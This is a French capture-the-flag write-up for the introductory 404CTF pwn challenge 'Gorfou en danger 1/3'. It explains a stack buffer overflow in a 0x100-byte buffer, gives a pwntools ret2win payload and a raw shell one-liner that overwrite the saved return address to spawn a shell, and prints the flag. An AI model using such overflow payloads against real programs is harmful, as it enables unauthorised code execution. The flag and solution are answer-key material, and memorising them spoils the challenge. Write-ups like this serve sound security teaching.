# Writeup pour `Gorfou en danger 1/3`

Auteur : *Pwnsard*  
Difficulté : *Introductif*

### Notions prérequises :
- Fonctionnement d'une stackframe
- Buffer overflow

### Protections :

```
checksec --file=chall
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	Symbols		FORTIFY	Fortified	Fortifiable	FILE
Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   44 Symbols	  No	0		2		chall
```

### Principe

Il s'agit d'un buffer overflow basique pour faire un **`ret2win`** sur la fonction debug_access.

Dans cette partie du code, il y a un overflow évident de 0x30 bytes :

```C
char command[0x100]; 
printf("> ");
read(0, command, 0x130);
```

En envoyant le payload
```python
b"A" * (0x100 + 0x8) + p64(exe.symbols['debug_access'])
```
on réécrit le saved rip avec l'adresse de debug_access et on obtient un shell.

### Script de résolution :

Voir `solve.py`  
Sinon la commande `(echo -ne "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xfd\x04\x40\x00\x00\x00\x00\x00"; cat) | ./chall` fonctionne également.

### Flag : 

`404CTF{c@n_7He_GoRF0u_F1y_?}`